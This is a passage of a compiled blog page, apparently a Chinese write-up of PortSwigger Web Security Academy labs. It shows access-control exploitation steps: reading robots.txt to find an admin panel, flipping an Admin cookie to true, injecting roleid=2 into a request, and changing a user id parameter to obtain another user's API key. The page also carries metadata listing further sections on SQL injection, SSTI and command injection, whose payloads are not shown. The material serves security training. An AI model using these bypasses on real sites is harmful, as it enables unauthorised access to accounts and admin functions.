alt="image-20230121231859194"></p><blockquote><p>访问控制（或授权）是对谁（或什么）可以执行尝试的操作或访问他们请求的资源的约束的应用。在web应用程序的上下文中，访问控制取决于身份验证和会话管理：</p><ul><li><p>身份验证可识别用户并确认他们是他们所说的人。</p></li><li><p>会话管理标识同一用户正在发出哪些后续HTTP请求。</p></li><li><p>访问控制确定是否允许用户执行他们试图执行的操作。</p></li></ul><p>破坏的访问控制是一个常见的、通常是关键的安全漏洞。访问控制的设计和管理是一个复杂而动态的问题，它将业务、组织和法律约束应用于技术实现。访问控制设计决策必须由人类而非技术做出，并且错误的可能性很高。</p></blockquote><h2 id="unprotected-admin-functionality" tabindex="-1"><a class="header-anchor" href="#unprotected-admin-functionality"><span>Unprotected admin functionality</span></a></h2><blockquote><p>这个实验室有一个不受保护的管理面板。通过删除用户carlos来解决实验室问题。</p></blockquote><p>robots数据泄露，访问/robots.txt</p><p><img src="'+Ma+'" alt="image-20230121232448970"></p><p>再访问/administrator-panel，直接垂直越权，删除用户carlos</p><p><img src="'+Aa+'" alt="image-20230121232548653"></p><h2 id="unprotected-admin-functionality-with-unpredictable-url" tabindex="-1"><a class="header-anchor" href="#unprotected-admin-functionality-with-unpredictable-url"><span>Unprotected admin functionality with unpredictable URL</span></a></h2><blockquote><p>这个实验室有一个不受保护的管理面板。它位于一个不可预测的位置，但该位置在应用程序中的某个位置被公开。 通过访问管理面板并使用它删除用户carlos来解决实验室问题。</p></blockquote><p>查看页面源代码，访问/admin-0ijqim，删除用户carlos</p><p><img src="'+Fa+'" alt="image-20230121232746116"></p><p><img src="'+Wa+'" alt="image-20230121232838128"></p><h2 id="user-role-controlled-by-request-parameter" tabindex="-1"><a class="header-anchor" href="#user-role-controlled-by-request-parameter"><span>User role controlled by request parameter</span></a></h2><blockquote><p>这个实验室有一个位于/admin的管理面板，用于识别使用可伪造cookie的管理员。 通过访问管理面板并使用它删除用户carlos来解决实验室问题。 您可以使用以下凭据登录到自己的帐户：wiener:peter</p></blockquote><p>登录账户，修改cookie，将Admin=false改为Admin=true</p><p><img src="'+Qa+'" alt="image-20230121233216467"></p><p>随后访问/admin，删除用户carlos</p><p><img src="'+Ha+'" alt="image-20230121233351378"></p><h2 id="user-role-can-be-modified-in-user-profile" tabindex="-1"><a class="header-anchor" href="#user-role-can-be-modified-in-user-profile"><span>User role can be modified in user profile</span></a></h2><blockquote><p>这个实验室有一个位于/admin的管理面板。只有角色ID为2的登录用户才能访问它。 通过访问管理面板并使用它删除用户carlos来解决实验室问题。 您可以使用以下凭据登录到自己的帐户：wiener:peter</p></blockquote><p>登录账户，抓取更新邮箱的数据包，查看response发现一个roleid</p><p><img src="'+za+'" alt="image-20230121233836789"></p><p>于是我们尝试在请求时添加这个字段，传入的参数值为2，成功越权</p><p><img src="'+Ga+'" alt="image-20230121233940849"></p><p>访问/admin，删除用户carlos</p><p><img src="'+Ya+'" alt="image-20230121234031120"></p><h2 id="user-id-controlled-by-request-parameter" tabindex="-1"><a class="header-anchor" href="#user-id-controlled-by-request-parameter"><span>User ID controlled by request parameter</span></a></h2><blockquote><p>此实验室在用户帐户页面上存在横向权限提升漏洞。 要解决实验室问题，请获取用户carlos的API密钥并将其作为解决方案提交。 您可以使用以下凭据登录到自己的帐户：wiener:peter</p></blockquote><p>抓取点击<strong>My account</strong>请求的数据包，发现请求的参数含有wiener，我们将其改为carlos便可以伪造登录</p><p><img src="'+Xa+'" alt="image-20230121234502121"></p><p><img src="'+Za+'" alt="image-20230121234537455"></p><h2 id="user-id-controlled-by-request-parameter-with-unpredictable-user-ids" tabindex="-1"><a class="header-anchor" href="#user-id-controlled-by-request-parameter-with-unpredictable-user-ids"><span>User ID controlled by request parameter, with unpredictable user IDs</span></a></h2><blockquote><p>此实验室在用户帐户页面上存在横向权限提升漏洞，但使用GUID标识用户。 要解决实验室问题，请找到carlos的GUID，然后提交他的API密钥作为解决方案。 您可以使用以下凭据登录到自己的帐户：wiener:peter</p></blockquote><p>登录用户，抓取登录的数据包，可以发现请求了<code>id=e6b5074a-501e-4b08-8d69-1e8dbb2af207</code>，这一段id是代表我们的用户id</p><p><img src="'+Va+'" alt="image-20230204171127553"></p><p>接下来我们找到carlos的文章，获取到<code>id=af9a8df9-9e0d-4b4d-aba4-d58c4115281b</code></p><p><img src="'+Ja+'" alt="image-20230204171216075"></p><p><img src="'+Ka+'" alt="image-20230204171318084"></p>',62);function te(pe,oe){const n=i("ExternalLinkIcon");return l(),c("div",null,[sn,s("p",null,[a("先去官方文档了解一下RUBY的"),s("a",an,[a("ERB模板"),e(n)]),a("，可以看到**<%= Ruby expression -- replace with result %>**表示该格式可以内嵌表达式")]),nn,s("p",null,[a("通过阅读Tornado文档中"),s("a",en,[a("template"),e(n)]),a("的用法，我们了解到模板表达式被双花括号包围: "),tn,a("，然后转义并且插入到输出")]),pn,on,ln,cn,s("p",null,[a("接着我们利用双花括号包围的python表达式构建shell命令（详细见上文提到的"),s("a",rn,[a("语法参考"),e(n)]),a("），将"),un,a("改为"),dn,a("，再次查看评论区回显")]),gn,s("p",null,[a("通过查阅freemarker的文档，发现有对"),s("a",mn,[a("模板的上传安全性"),e(n)]),a("进行说明，提到了"),kn,a("。")]),bn,s("p",null,[a("查阅官方文档对"),s("a",hn,[a("new函数"),e(n)]),a("的描述，我们可以通过"),_n,a("的"),vn,a("类来执行shell命令")]),fn,s("p",null,[a("在网上找到一份"),s("a",yn,[a("POC"),e(n)]),a("：")]),wn,s("p",null,[a("学习"),s("a",qn,[a("Django文档"),e(n)]),a("，调用debug内置函数："),En,a("，返回此模板内访问的对象和属性的列表")]),Ln,s("p",null,[a("研究官方文档中关于"),s("a",xn,[a("settings"),e(n)]),a("的描述，其中含有的SECRET_KEY属性正是我们要窃取的密钥")]),Sn,s("blockquote",null,[s("p",null,[Nn,a("（"),s("a",Cn,[a("CORS"),e(n)]),a("，或通俗地译为跨域资源共享）是一种基于 "),s("a",Tn,[a("HTTP"),e(n)]),a(" 头的机制，该机制通过允许服务器标示除了它自己以外的其它"),s("a",On,[a("源"),e(n)]),a("（域、协议或端口），使得浏览器允许这些源访问加载自己的资源。跨源资源共享还通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的“预检”请求。在预检中，浏览器发送的头中标示有 HTTP 方法和真实请求中会用到的头。")])]),Rn,s("blockquote",null,[In,s("ul",null,[s("li",null,[s("a",Un,[a("候选人名 "),e(n)])]),s("li",null,[s("a",jn,[a("候选人的密码 "),e(n)])])]),Bn]),Dn,s("blockquote",null,[Pn,s("ul",null,[Mn,s("li",null,[s("p",null,[s("a",An,[a("候选人名 "),e(n)])])]),s("li",null,[s("p",null,[s("a",Fn,[a("候选人的密码"),e(n)])])])]),Wn]),Qn,s("blockquote",null,[Hn,s("ul",null,[zn,Gn,s("li",null,[s("a",Yn,[a("候选人的密码 "),e(n)])])])]),Xn,s("blockquote",null,[Zn,s("ul",null,[s("li",null,[s("a",Vn,[a("候选人名 "),e(n)])]),s("li",null,[s("a",Jn,[a("候选人的密码 "),e(n)])])])]),Kn,s("blockquote",null,[$n,s("ul",null,[se,ae,s("li",null,[s("a",ne,[a("候选人的密码 "),e(n)])])])]),ee])}const le=o($a,[["render",te],["__file","PortSwigger-Writeup.html.vue"]]),ce=JSON.parse(`{"path":"/blogs/jishu/PortSwigger-Writeup.html","title":"PortSwigger-Writeup","lang":"zh-CN","frontmatter":{"title":"PortSwigger-Writeup","mathjax":true,"date":"2022/11/09","tags":["Web","SQLI","命令注入","目录遍历","CORS","Authentication","越权"],"categories":["技术"],"description":"之前将PortSwigger的每个Writeup都作为单独的文章，导致博客被这个刷屏😩 现在将这些Writeup做个汇总，包含这几个部分📚： SQLI XSS SSTI 命令注入 目录遍历 CORS Authentication 越权 本文所谈及技术只为网络安全人员进行服务器检测或维护参考，仅供学习交流，请勿用于违法用途。 SQLI 想到之前sql...","head":[["meta",{"property":"og:url","content":"https://sakee.cn/sake-s-blog/blogs/%E6%8A%80%E6%9C%AF/PortSwigger-Writeup.html"}],["meta",{"property":"og:site_name","content":"sake's blog"}],["meta",{"property":"og:title","content":"PortSwigger-Writeup"}],["meta",{"property":"og:description","content":"之前将PortSwigger的每个Writeup都作为单独的文章，导致博客被这个刷屏😩 现在将这些Writeup做个汇总，包含这几个部分📚： SQLI XSS SSTI 命令注入 目录遍历 CORS Authentication 越权 本文所谈及技术只为网络安全人员进行服务器检测或维护参考，仅供学习交流，请勿用于违法用途。 SQLI 想到之前sql..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2024-08-10T20:00:17.000Z"}],["meta",{"property":"article:author","content":"fullstacksake"}],["meta",{"property":"article:tag","content":"Web"}],["meta",{"property":"article:tag","content":"SQLI"}],["meta",{"property":"article:tag","content":"命令注入"}],["meta",{"property":"article:tag","content":"目录遍历"}],["meta",{"property":"article:tag","content":"CORS"}],["meta",{"property":"article:tag","content":"Authentication"}],["meta",{"property":"article:tag","content":"越权"}],["meta",{"property":"article:published_time","content":"2022-11-08T16:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2024-08-10T20:00:17.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"PortSwigger-Writeup\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2022-11-08T16:00:00.000Z\\",\\"dateModified\\":\\"2024-08-10T20:00:17.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"fullstacksake\\",\\"email\\":\\"fullstacksake@outlook.com\\"}]}"],["meta",{"property":"og:url","content":"https://sakee.cn/sake-s-blog/blogs/jishu/PortSwigger-Writeup.html"}],["meta",{"property":"og:site_name","content":"sake's blog"}],["meta",{"property":"og:title","content":"PortSwigger-Writeup"}],["meta",{"property":"og:description","content":"之前将PortSwigger的每个Writeup都作为单独的文章，导致博客被这个刷屏😩 现在将这些Writeup做个汇总，包含这几个部分📚： SQLI XSS SSTI 命令注入 目录遍历 CORS Authentication 越权 本文所谈及技术只为网络安全人员进行服务器检测或维护参考，仅供学习交流，请勿用于违法用途。 SQLI 想到之前sql..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2024-08-10T20:00:17.000Z"}],["meta",{"property":"article:author","content":"fullstacksake"}],["meta",{"property":"article:tag","content":"Web"}],["meta",{"property":"article:tag","content":"SQLI"}],["meta",{"property":"article:tag","content":"命令注入"}],["meta",{"property":"article:tag","content":"目录遍历"}],["meta",{"property":"article:tag","content":"CORS"}],["meta",{"property":"article:tag","content":"Authentication"}],["meta",{"property":"article:tag","content":"越权"}],["meta",{"property":"article:published_time","content":"2022-11-08T16:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2024-08-10T20:00:17.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"PortSwigger-Writeup\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2022-11-08T16:00:00.000Z\\",\\"dateModified\\":\\"2024-08-10T20:00:17.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"fullstacksake\\",\\"email\\":\\"fullstacksake@outlook.com\\"}]}"]]},"headers":[{"level":2,"title":"WHERE子句中的SQL注入漏洞允许检索隐藏数据","slug":"where子句中的sql注入漏洞允许检索隐藏数据","link":"#where子句中的sql注入漏洞允许检索隐藏数据","children":[]},{"level":2,"title":"允许绕过登录的SQL注入漏洞","slug":"允许绕过登录的sql注入漏洞","link":"#允许绕过登录的sql注入漏洞","children":[]},{"level":2,"title":"UNION攻击查询返回的列数","slug":"union攻击查询返回的列数","link":"#union攻击查询返回的列数","children":[]},{"level":2,"title":"UNION攻击查找包含文本的列","slug":"union攻击查找包含文本的列","link":"#union攻击查找包含文本的列","children":[]},{"level":2,"title":"UNION攻击从其他表中检索数据","slug":"union攻击从其他表中检索数据","link":"#union攻击从其他表中检索数据","children":[]},{"level":2,"title":"UNION 攻击在单个列中检索多个值","slug":"union-攻击在单个列中检索多个值","link":"#union-攻击在单个列中检索多个值","children":[]},{"level":2,"title":"查询Oracle上的数据库类型和版本","slug":"查询oracle上的数据库类型和版本","link":"#查询oracle上的数据库类型和版本","children":[]},{"level":2,"title":"查询MySQL和微软上的数据库类型和版本","slug":"查询mysql和微软上的数据库类型和版本","link":"#查询mysql和微软上的数据库类型和版本","children":[]},{"level":2,"title":"列出非 Oracle 数据库上的数据库内容","slug":"列出非-oracle-数据库上的数据库内容","link":"#列出非-oracle-数据库上的数据库内容","children":[]},{"level":2,"title":"列出Oracle上的数据库内容","slug":"列出oracle上的数据库内容","link":"#列出oracle上的数据库内容","children":[]},{"level":2,"title":"带有条件响应的SQL盲注","slug":"带有条件响应的sql盲注","link":"#带有条件响应的sql盲注","children":[]},{"level":2,"title":"带有条件错误的SQL盲注","slug":"带有条件错误的sql盲注","link":"#带有条件错误的sql盲注","children":[]},{"level":2,"title":"带有时间延时的SQL注入","slug":"带有时间延时的sql注入","link":"#带有时间延时的sql注入","children":[]},{"level":2,"title":"带有时间延迟和信息检索的SQL盲注","slug":"带有时间延迟和信息检索的sql盲注","link":"#带有时间延迟和信息检索的sql盲注","children":[]},{"level":2,"title":"OOB盲注","slug":"oob盲注","link":"#oob盲注","children":[]},{"level":2,"title":"------------------------------","slug":"","link":"#","children":[]},{"level":2,"title":"无编码反射型XSS","slug":"无编码反射型xss","link":"#无编码反射型xss","children":[]},{"level":2,"title":"------------------------------","slug":"-1","link":"#-1","children":[]},{"level":2,"title":"Basic server-side template injection","slug":"basic-server-side-template-injection","link":"#basic-server-side-template-injection","children":[]},{"level":2,"title":"Basic server-side template injection (code context)","slug":"basic-server-side-template-injection-code-context","link":"#basic-server-side-template-injection-code-context","children":[]},{"level":2,"title":"Server-side template injection using documentation","slug":"server-side-template-injection-using-documentation","link":"#server-side-template-injection-using-documentation","children":[]},{"level":2,"title":"Server-side template injection in an unknown language with a documented exploit","slug":"server-side-template-injection-in-an-unknown-language-with-a-documented-exploit","link":"#server-side-template-injection-in-an-unknown-language-with-a-documented-exploit","children":[]},{"level":2,"title":"Server-side template injection with information disclosure via user-supplied objects","slug":"server-side-template-injection-with-information-disclosure-via-user-supplied-objects","link":"#server-side-template-injection-with-information-disclosure-via-user-supplied-objects","children":[]},{"level":2,"title":"------------------------------","slug":"-2","link":"#-2","children":[]},{"level":2,"title":"简单案例1","slug":"简单案例1","link":"#简单案例1","children":[]},{"level":2,"title":"基于时间的命令盲注","slug":"基于时间的命令盲注","link":"#基于时间的命令盲注","children":[]},{"level":2,"title":"命令注入与输出重定向","slug":"命令注入与输出重定向","link":"#命令注入与输出重定向","children":[]},{"level":2,"title":"命令注入与OOB","slug":"命令注入与oob","link":"#命令注入与oob","children":[]},{"level":2,"title":"命令注入与带外数据泄露","slug":"命令注入与带外数据泄露","link":"#命令注入与带外数据泄露","children":[]},{"level":2,"title":"------------------------------","slug":"-3","link":"#-3","children":[]},{"level":2,"title":"简单案例1","slug":"简单案例1-1","link":"#简单案例1-1","children":[]},{"level":2,"title":"简单案例2","slug":"简单案例2","link":"#简单案例2","children":[]},{"level":2,"title":"简单案例3","slug":"简单案例3","link":"#简单案例3","children":[]},{"level":2,"title":"简单案例4","slug":"简单案例4","link":"#简单案例4","children":[]},{"level":2,"title":"简单案例5","slug":"简单案例5","link":"#简单案例5","children":[]},{"level":2,"title":"简单案例6","slug":"简单案例6","link":"#简单案例6","children":[]},{"level":2,"title":"------------------------------","slug":"-4","link":"#-4","children":[]},{"level":2,"title":"CORS vulnerability with basic origin reflection","slug":"cors-vulnerability-with-basic-origin-reflection","link":"#cors-vulnerability-with-basic-origin-reflection","children":[]},{"level":2,"title":"------------------------------","slug":"-5","link":"#-5","children":[]},{"level":2,"title":"Username enumeration via different responses","slug":"username-enumeration-via-different-responses","link":"#username-enumeration-via-different-responses","children":[]},{"level":2,"title":"2FA simple bypass","slug":"_2fa-simple-bypass","link":"#_2fa-simple-bypass","children":[]},{"level":2,"title":"Password reset broken logic","slug":"password-reset-broken-logic","link":"#password-reset-broken-logic","children":[]},{"level":2,"title":"Username enumeration via subtly different responses","slug":"username-enumeration-via-subtly-different-responses","link":"#username-enumeration-via-subtly-different-responses","children":[]},{"level":2,"title":"Username enumeration via response timing","slug":"username-enumeration-via-response-timing","link":"#username-enumeration-via-response-timing","children":[]},{"level":2,"title":"Broken brute-force protection, IP block","slug":"broken-brute-force-protection-ip-block","link":"#broken-brute-force-protection-ip-block","children":[]},{"level":2,"title":"Username enumeration via account lock","slug":"username-enumeration-via-account-lock","link":"#username-enumeration-via-account-lock","children":[]},{"level":2,"title":"2FA broken logic","slug":"_2fa-broken-logic","link":"#_2fa-broken-logic","children":[]},{"level":2,"title":"Brute-forcing a stay-logged-in cookie","slug":"brute-forcing-a-stay-logged-in-cookie","link":"#brute-forcing-a-stay-logged-in-cookie","children":[]},{"level":2,"title":"Offline password cracking","slug":"offline-password-cracking","link":"#offline-password-cracking","children":[]},{"level":2,"title":"------------------------------","slug":"-6","link":"#-6","children":[]},{"level":2,"title":"Unprotected admin functionality","slug":"unprotected-admin-functionality","link":"#unprotected-admin-functionality","children":[]},{"level":2,"title":"Unprotected admin functionality with unpredictable URL","slug":"unprotected-admin-functionality-with-unpredictable-url","link":"#unprotected-admin-functionality-with-unpredictable-url","children":[]},{"level":2,"title":"User role controlled by request parameter","slug":"user-role-controlled-by-request-parameter","link":"#user-role-controlled-by-request-parameter","children":[]},{"level":2,"title":"User role can be modified in user profile","slug":"user-role-can-be-modified-in-user-profile","link":"#user-role-can-be-modified-in-user-profile","children":[]},{"level":2,"title":"User ID controlled by request parameter","slug":"user-id-controlled-by-request-parameter","link":"#user-id-controlled-by-request-parameter","children":[]},{"level":2,"title":"User ID controlled by request parameter, with unpredictable user IDs","slug":"user-id-controlled-by-request-parameter-with-unpredictable-user-ids","link":"#user-id-controlled-by-request-parameter-with-unpredictable-user-ids","children":[]}],"git":{"createdTime":1723320017000,"updatedTime":1723320017000,"contributors":[{"name":"fullstacksake@gmail.com","email":"64351788+fullstack-sake@users.noreply.github.com","commits":1}]},"filePathRelative":"blogs/技术/PortSwigger-Writeup.md"}`);export{le as comp,ce as data};
